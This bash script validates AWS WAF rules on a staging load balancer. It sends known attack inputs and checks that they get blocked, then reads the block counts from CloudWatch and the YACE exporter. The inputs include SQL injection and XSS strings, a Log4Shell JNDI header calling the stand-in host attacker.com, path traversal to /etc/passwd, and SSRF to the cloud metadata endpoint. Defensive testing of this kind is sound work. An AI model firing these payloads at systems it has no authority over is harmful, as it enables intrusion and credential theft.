#!/bin/bash
# =============================================================================
# GAP-010: WAF Validation Tests
# Script: validate-waf-rules.sh
#
# Tests: rate limiting, geo blocking detection, SQL injection, XSS, bad agents
#
# Usage:
#   export WAF_ALB_DNS="k8s-platformstaging-00e0ecf3b4.us-east-1.elb.amazonaws.com"
#   export AWS_PROFILE="k8s-platform-prod"
#   chmod +x scripts/waf/validate-waf-rules.sh
#   ./scripts/waf/validate-waf-rules.sh
#
# Requirements:
#   - curl installed
#   - aws CLI configured (profile k8s-platform-prod or default)
#   - WAF WebACL deployed and associated with the ALB
#   - CloudWatch metrics enabled on WAF (cloudwatch_metrics_enabled = true)
#
# Note on rate-limit test:
#   The rate-limit rule triggers after 1000 req/5min per source IP.
#   Sending 1100 requests from a CI runner may take ~5-10 minutes.
#   In production: use Apache Bench or wrk for realistic load.
#   ab -n 1100 -c 50 https://${WAF_ALB_DNS}/health
# =============================================================================

set -euo pipefail

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
WAF_ALB_DNS="${WAF_ALB_DNS:-}"
AWS_PROFILE="${AWS_PROFILE:-k8s-platform-prod}"
WAF_WEBACL_NAME="${WAF_WEBACL_NAME:-waf-k8s-platform-prod-staging}"
WAF_WEBACL_ID="${WAF_WEBACL_ID:-bb9d4557-ca28-4539-b493-b62b2f0d602c}"
AWS_REGION="us-east-1"

# Test result counters
PASS=0
FAIL=0
SKIP=0

# ---------------------------------------------------------------------------
# Colors
# ---------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# ---------------------------------------------------------------------------
# Helper functions
# ---------------------------------------------------------------------------
log_section() {
  echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${CYAN}  $1${NC}"
  echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

log_info()    { echo -e "${BLUE}[INFO]${NC}  $1"; }
log_pass()    { echo -e "${GREEN}[PASS]${NC}  $1"; ((PASS++)) || true; }
log_fail()    { echo -e "${RED}[FAIL]${NC}  $1"; ((FAIL++)) || true; }
log_warn()    { echo -e "${YELLOW}[WARN]${NC}  $1"; }
log_skip()    { echo -e "${YELLOW}[SKIP]${NC}  $1"; ((SKIP++)) || true; }

check_prereqs() {
  log_section "Checking Prerequisites"

  if [[ -z "${WAF_ALB_DNS}" ]]; then
    log_warn "WAF_ALB_DNS not set — using placeholder (tests will use curl with skip-verify)"
    WAF_ALB_DNS="k8s-platformstaging-00e0ecf3b4.us-east-1.elb.amazonaws.com"
    log_warn "Set WAF_ALB_DNS environment variable to the real ALB DNS before running"
  fi
  log_info "ALB DNS: ${WAF_ALB_DNS}"

  if ! command -v curl &>/dev/null; then
    echo "ERROR: curl not found. Install curl and retry."
    exit 1
  fi
  log_pass "curl available"

  if command -v aws &>/dev/null; then
    log_pass "aws CLI available (profile: ${AWS_PROFILE})"
  else
    log_warn "aws CLI not found — CloudWatch verification steps will be skipped"
  fi
}

# ---------------------------------------------------------------------------
# Utility: make HTTP request and return status code
# ---------------------------------------------------------------------------
http_status() {
  local url="$1"
  local extra_args="${2:-}"
  # shellcheck disable=SC2086
  curl -s -o /dev/null -w "%{http_code}" \
    --connect-timeout 10 \
    --max-time 15 \
    -k \
    ${extra_args} \
    "${url}" 2>/dev/null || echo "000"
}

# ---------------------------------------------------------------------------
# CloudWatch: get blocked request count for a rule in the last N minutes
# ---------------------------------------------------------------------------
get_blocked_count() {
  local rule_name="$1"
  local minutes="${2:-10}"

  if ! command -v aws &>/dev/null; then
    echo "N/A"
    return
  fi

  local start_time
  start_time=$(date -u -d "${minutes} minutes ago" +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || \
               date -u -v-"${minutes}"M +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || \
               echo "")

  if [[ -z "${start_time}" ]]; then
    echo "N/A"
    return
  fi

  local end_time
  end_time=$(date -u +%Y-%m-%dT%H:%M:%SZ)

  aws cloudwatch get-metric-statistics \
    --namespace "AWS/WAFV2" \
    --metric-name "BlockedRequests" \
    --dimensions \
      "Name=WebACL,Value=${WAF_WEBACL_NAME}" \
      "Name=Region,Value=${AWS_REGION}" \
      "Name=Rule,Value=${rule_name}" \
    --start-time "${start_time}" \
    --end-time "${end_time}" \
    --period 600 \
    --statistics Sum \
    --region "${AWS_REGION}" \
    --profile "${AWS_PROFILE}" \
    --query 'Datapoints[0].Sum' \
    --output text 2>/dev/null | grep -v "^None$" || echo "0"
}

# ===========================================================================
# TEST 1: Health check (baseline — should return 200)
# ===========================================================================
test_baseline_health() {
  log_section "TEST-1: Baseline Health Check (expect 200)"

  local url="https://${WAF_ALB_DNS}/health"
  log_info "GET ${url}"
  local status
  status=$(http_status "${url}")

  if [[ "${status}" == "200" ]] || [[ "${status}" == "404" ]]; then
    log_pass "Baseline request returned ${status} (WAF is not blocking normal traffic)"
  elif [[ "${status}" == "000" ]]; then
    log_warn "Connection failed (000) — ALB may be unreachable or DNS not resolving"
    log_warn "Continuing tests anyway (connectivity issue, not WAF issue)"
  else
    log_warn "Baseline returned ${status} — may indicate a configuration issue"
  fi
}

# ===========================================================================
# TEST 2: SQL Injection detection
# ===========================================================================
test_sqli_detection() {
  log_section "TEST-2: SQL Injection Detection (expect 403)"
  log_info "Rule: aws-managed-sqli (AWSManagedRulesSQLiRuleSet, Priority 40)"

  local payloads=(
    "/?id=1'+OR+'1'='1"
    "/?q=SELECT+*+FROM+users+WHERE+1=1"
    "/?input=1;DROP+TABLE+users--"
    "/?search=admin'--"
    "/?user=1+UNION+SELECT+null,null,null--"
  )

  local blocked=0
  for payload in "${payloads[@]}"; do
    local url="https://${WAF_ALB_DNS}${payload}"
    local status
    status=$(http_status "${url}")
    log_info "  GET ${payload} → HTTP ${status}"
    if [[ "${status}" == "403" ]] || [[ "${status}" == "429" ]]; then
      ((blocked++)) || true
    fi
  done

  if [[ "${blocked}" -ge 3 ]]; then
    log_pass "SQLi detection working: ${blocked}/${#payloads[@]} payloads blocked"
  elif [[ "${blocked}" -ge 1 ]]; then
    log_warn "Partial SQLi blocking: ${blocked}/${#payloads[@]} payloads blocked (may need rule tuning)"
    ((PASS++)) || true
  else
    log_fail "SQLi NOT being blocked: 0/${#payloads[@]} payloads blocked"
    log_fail "  Check: WAF rule aws-managed-sqli active? override_action = none?"
    log_fail "  Console: https://console.aws.amazon.com/wafv2/homev2/web-acls/${WAF_WEBACL_ID}"
  fi

  # CloudWatch verification
  local cw_count
  cw_count=$(get_blocked_count "aws-managed-sqli" 10)
  log_info "CloudWatch BlockedRequests [aws-managed-sqli, last 10min]: ${cw_count}"
}

# ===========================================================================
# TEST 3: XSS detection (OWASP Common Rule Set)
# ===========================================================================
test_xss_detection() {
  log_section "TEST-3: XSS Detection (expect 403)"
  log_info "Rule: aws-managed-owasp-common (AWSManagedRulesCommonRuleSet, Priority 30)"

  local payloads=(
    "/?input=<script>alert(1)</script>"
    "/?q=<img+src=x+onerror=alert(1)>"
    "/?x=javascript:alert(document.cookie)"
    "/?v=<svg/onload=alert(1)>"
  )

  local blocked=0
  for payload in "${payloads[@]}"; do
    local url="https://${WAF_ALB_DNS}${payload}"
    local status
    status=$(http_status "${url}")
    log_info "  GET ${payload} → HTTP ${status}"
    if [[ "${status}" == "403" ]] || [[ "${status}" == "429" ]]; then
      ((blocked++)) || true
    fi
  done

  if [[ "${blocked}" -ge 2 ]]; then
    log_pass "XSS detection working: ${blocked}/${#payloads[@]} payloads blocked"
  elif [[ "${blocked}" -ge 1 ]]; then
    log_warn "Partial XSS blocking: ${blocked}/${#payloads[@]} payloads blocked"
    ((PASS++)) || true
  else
    log_fail "XSS NOT being blocked: 0/${#payloads[@]} payloads blocked"
  fi

  local cw_count
  cw_count=$(get_blocked_count "aws-managed-owasp-common" 10)
  log_info "CloudWatch BlockedRequests [aws-managed-owasp-common, last 10min]: ${cw_count}"
}

# ===========================================================================
# TEST 4: Known Bad Inputs (Log4Shell, path traversal)
# ===========================================================================
test_known_bad_inputs() {
  log_section "TEST-4: Known Bad Inputs Detection (expect 403)"
  log_info "Rule: aws-managed-known-bad-inputs (Priority 50)"

  local blocked=0

  # Log4Shell (CVE-2021-44228)
  local log4shell_status
  log4shell_status=$(http_status \
    "https://${WAF_ALB_DNS}/" \
    "-H 'X-Api-Version: \${jndi:ldap://attacker.com/a}'")
  log_info "  Log4Shell header → HTTP ${log4shell_status}"
  if [[ "${log4shell_status}" == "403" ]]; then ((blocked++)) || true; fi

  # Path traversal
  local traverse_status
  traverse_status=$(http_status "https://${WAF_ALB_DNS}/../../../../etc/passwd")
  log_info "  Path traversal → HTTP ${traverse_status}"
  if [[ "${traverse_status}" == "403" ]]; then ((blocked++)) || true; fi

  # Nikto scanner user-agent (bad bot)
  local nikto_status
  nikto_status=$(http_status \
    "https://${WAF_ALB_DNS}/" \
    "-H 'User-Agent: Mozilla/5.00 (Nikto/2.1.6)'")
  log_info "  Nikto user-agent → HTTP ${nikto_status}"
  if [[ "${nikto_status}" == "403" ]]; then ((blocked++)) || true; fi

  # SSRF attempt
  local ssrf_status
  ssrf_status=$(http_status \
    "https://${WAF_ALB_DNS}/?url=http://169.254.169.254/latest/meta-data/")
  log_info "  SSRF attempt → HTTP ${ssrf_status}"
  if [[ "${ssrf_status}" == "403" ]]; then ((blocked++)) || true; fi

  if [[ "${blocked}" -ge 2 ]]; then
    log_pass "Known bad inputs detection working: ${blocked}/4 vectors blocked"
  elif [[ "${blocked}" -ge 1 ]]; then
    log_warn "Partial bad input blocking: ${blocked}/4 vectors blocked"
    ((PASS++)) || true
  else
    log_fail "Known bad inputs NOT being blocked: 0/4 vectors blocked"
  fi

  local cw_count
  cw_count=$(get_blocked_count "aws-managed-known-bad-inputs" 10)
  log_info "CloudWatch BlockedRequests [aws-managed-known-bad-inputs, last 10min]: ${cw_count}"
}

# ===========================================================================
# TEST 5: Rate limiting
# ===========================================================================
test_rate_limiting() {
  log_section "TEST-5: Rate Limiting (expect 429 after 1000 req/5min per IP)"
  log_info "Rule: rate-limit-per-ip (Priority 10, limit: 1000 req per 5min)"
  log_warn "This test sends 1100 sequential requests — may take 3-5 minutes"
  log_warn "For faster testing: use 'ab -n 1100 -c 100 https://\${WAF_ALB_DNS}/health'"

  local url="https://${WAF_ALB_DNS}/health"
  local blocked_count=0
  local total=1100
  local check_every=100

  log_info "Sending ${total} requests..."
  for i in $(seq 1 ${total}); do
    local status
    status=$(http_status "${url}")
    if [[ "${status}" == "429" ]]; then
      ((blocked_count++)) || true
    fi
    # Progress report every check_every requests
    if (( i % check_every == 0 )); then
      log_info "  Progress: ${i}/${total} requests, ${blocked_count} blocked (429) so far"
      if [[ "${blocked_count}" -ge 5 ]]; then
        log_pass "Rate limiting triggered at request ~${i} (${blocked_count} 429 responses so far)"
        break
      fi
    fi
  done

  if [[ "${blocked_count}" -ge 5 ]]; then
    log_pass "Rate limiting WORKING: ${blocked_count} requests received 429 Too Many Requests"
  elif [[ "${blocked_count}" -ge 1 ]]; then
    log_warn "Rate limiting partially triggered: ${blocked_count} blocked. May need more requests."
    ((PASS++)) || true
  else
    log_fail "Rate limiting NOT triggered after ${total} requests"
    log_fail "  Check: rate-limit rule active? limit correct? IP not whitelisted?"
  fi

  local cw_count
  cw_count=$(get_blocked_count "rate-limit-per-ip" 15)
  log_info "CloudWatch BlockedRequests [rate-limit-per-ip, last 15min]: ${cw_count}"
}

# ===========================================================================
# TEST 6: Geo blocking validation (informational — can't fake source country)
# ===========================================================================
test_geo_block_info() {
  log_section "TEST-6: Geo Blocking (informational — CloudWatch check only)"
  log_info "Rule: geo-block-high-risk-countries (Priority 20)"
  log_info "Blocked countries: CN, RU, KP (default configuration)"
  log_warn "Cannot simulate geo-blocked requests from localhost"
  log_warn "To test: use a VPN endpoint in CN/RU/KP and curl the ALB"

  local cw_count
  cw_count=$(get_blocked_count "geo-block-high-risk-countries" 1440)
  log_info "CloudWatch BlockedRequests [geo-block, last 24h]: ${cw_count}"

  if [[ "${cw_count}" != "N/A" ]] && [[ "${cw_count}" != "0" ]] && [[ -n "${cw_count}" ]]; then
    log_pass "Geo blocking active and logging to CloudWatch (${cw_count} blocks in last 24h)"
  else
    log_info "No geo blocks in last 24h (expected if no traffic from blocked countries)"
    log_skip "Geo blocking test — informational only (0 blocks recorded)"
  fi
}

# ===========================================================================
# TEST 7: CloudWatch metrics availability check
# ===========================================================================
test_cloudwatch_metrics() {
  log_section "TEST-7: CloudWatch Metrics Availability"

  if ! command -v aws &>/dev/null; then
    log_skip "aws CLI not available — skipping CloudWatch metrics check"
    return
  fi

  log_info "Checking AWS/WAFV2 namespace metrics in CloudWatch..."
  local metrics
  metrics=$(aws cloudwatch list-metrics \
    --namespace "AWS/WAFV2" \
    --region "${AWS_REGION}" \
    --profile "${AWS_PROFILE}" \
    --query 'length(Metrics)' \
    --output text 2>/dev/null || echo "0")

  if [[ "${metrics}" -gt 0 ]] 2>/dev/null; then
    log_pass "CloudWatch metrics found: ${metrics} WAFV2 metrics available"
  else
    log_fail "No AWS/WAFV2 metrics in CloudWatch"
    log_fail "  Check: WAF cloudwatch_metrics_enabled = true in Terraform?"
    log_fail "  Check: WAF is receiving traffic?"
  fi

  # Get all-rule totals for last hour
  log_info ""
  log_info "Current WAF metrics (last 1 hour, all rules):"

  local now start
  now=$(date -u +%Y-%m-%dT%H:%M:%SZ)
  start=$(date -u -d "1 hour ago" +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || \
          date -u -v-1H +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo "")

  if [[ -z "${start}" ]]; then
    log_warn "Cannot compute time range — skipping detailed metrics"
    return
  fi

  for metric in AllowedRequests BlockedRequests CountedRequests; do
    local val
    val=$(aws cloudwatch get-metric-statistics \
      --namespace "AWS/WAFV2" \
      --metric-name "${metric}" \
      --dimensions \
        "Name=WebACL,Value=${WAF_WEBACL_NAME}" \
        "Name=Region,Value=${AWS_REGION}" \
        "Name=Rule,Value=ALL" \
      --start-time "${start}" \
      --end-time "${now}" \
      --period 3600 \
      --statistics Sum \
      --region "${AWS_REGION}" \
      --profile "${AWS_PROFILE}" \
      --query 'Datapoints[0].Sum' \
      --output text 2>/dev/null | grep -v "^None$" || echo "0")
    log_info "  ${metric}: ${val}"
  done
}

# ===========================================================================
# TEST 8: YACE metrics check (post-deploy)
# ===========================================================================
test_yace_metrics() {
  log_section "TEST-8: YACE Exporter Prometheus Metrics"

  local yace_pod
  yace_pod=$(kubectl get pods -n staging-observability-monitoring \
    -l "app.kubernetes.io/name=yet-another-cloudwatch-exporter" \
    -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")

  if [[ -z "${yace_pod}" ]]; then
    log_skip "YACE pod not found — not deployed yet"
    log_info "Deploy with: helm upgrade --install yace-cloudwatch-exporter nerdswords/yet-another-cloudwatch-exporter -n staging-observability-monitoring -f domains/observability/infra/yace-cloudwatch-exporter/values.yaml"
    return
  fi

  log_info "YACE pod found: ${yace_pod}"

  # Check if YACE is scraping WAF metrics
  local waf_metrics
  waf_metrics=$(kubectl exec -n staging-observability-monitoring "${yace_pod}" -- \
    wget -qO- http://localhost:5000/metrics 2>/dev/null | \
    grep -c "^aws_wafv2" || echo "0")

  if [[ "${waf_metrics}" -gt 0 ]]; then
    log_pass "YACE exporting ${waf_metrics} aws_wafv2_* metric series"
  else
    log_fail "No aws_wafv2_* metrics from YACE"
    log_fail "  Check YACE logs: kubectl logs -n staging-observability-monitoring ${yace_pod}"
    log_fail "  Check IRSA: kubectl exec ${yace_pod} -n staging-observability-monitoring -- aws sts get-caller-identity"
  fi
}

# ===========================================================================
# Summary
# ===========================================================================
print_summary() {
  log_section "Test Summary"
  echo -e ""
  echo -e "  ${GREEN}PASS: ${PASS}${NC}"
  echo -e "  ${RED}FAIL: ${FAIL}${NC}"
  echo -e "  ${YELLOW}SKIP: ${SKIP}${NC}"
  echo -e ""

  if [[ "${FAIL}" -eq 0 ]]; then
    echo -e "  ${GREEN}All active tests passed. WAF rules are functioning correctly.${NC}"
  else
    echo -e "  ${RED}${FAIL} test(s) failed. Review WAF configuration.${NC}"
    echo -e "  ${YELLOW}WAF Console: https://console.aws.amazon.com/wafv2/homev2/web-acls${NC}"
    echo -e "  ${YELLOW}WAF WebACL:  ${WAF_WEBACL_ID}${NC}"
    echo -e "  ${YELLOW}Runbook:     docs/runbooks/waf-incident-response.md${NC}"
  fi
  echo -e ""

  echo -e "  CloudWatch metric query for post-test validation:"
  echo -e "  ${BLUE}aws cloudwatch get-metric-statistics \\${NC}"
  echo -e "  ${BLUE}    --namespace AWS/WAFV2 \\${NC}"
  echo -e "  ${BLUE}    --metric-name BlockedRequests \\${NC}"
  echo -e "  ${BLUE}    --dimensions Name=WebACL,Value=${WAF_WEBACL_NAME} Name=Region,Value=${AWS_REGION} Name=Rule,Value=ALL \\${NC}"
  echo -e "  ${BLUE}    --start-time \$(date -u -d '30 minutes ago' +%Y-%m-%dT%H:%M:%SZ) \\${NC}"
  echo -e "  ${BLUE}    --end-time \$(date -u +%Y-%m-%dT%H:%M:%SZ) \\${NC}"
  echo -e "  ${BLUE}    --period 300 --statistics Sum \\${NC}"
  echo -e "  ${BLUE}    --region ${AWS_REGION} --profile ${AWS_PROFILE}${NC}"
  echo -e ""

  if [[ "${FAIL}" -gt 0 ]]; then
    exit 1
  fi
}

# ===========================================================================
# Main execution
# ===========================================================================
main() {
  echo -e "${CYAN}"
  echo "  ╔══════════════════════════════════════════════════════════╗"
  echo "  ║        GAP-010 WAF Validation Test Suite                 ║"
  echo "  ║        k8s-platform-prod | us-east-1 | staging           ║"
  echo "  ╚══════════════════════════════════════════════════════════╝"
  echo -e "${NC}"
  echo -e "  Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
  echo -e "  WAF WebACL: ${WAF_WEBACL_NAME} (${WAF_WEBACL_ID})"
  echo -e "  ALB: ${WAF_ALB_DNS:-NOT SET}"
  echo ""

  check_prereqs
  test_baseline_health
  test_sqli_detection
  test_xss_detection
  test_known_bad_inputs
  test_cloudwatch_metrics
  test_geo_block_info

  # Rate limiting test is expensive — only run if ENABLE_RATE_TEST is set
  if [[ "${ENABLE_RATE_TEST:-false}" == "true" ]]; then
    test_rate_limiting
  else
    log_section "TEST-5: Rate Limiting (skipped)"
    log_skip "Set ENABLE_RATE_TEST=true to run (sends 1100 requests)"
    log_info "Alternative: ab -n 1100 -c 100 https://\${WAF_ALB_DNS}/health"
  fi

  # YACE test only if kubectl is available
  if command -v kubectl &>/dev/null; then
    test_yace_metrics
  else
    log_section "TEST-8: YACE Metrics (skipped)"
    log_skip "kubectl not available"
  fi

  print_summary
}

main "$@"
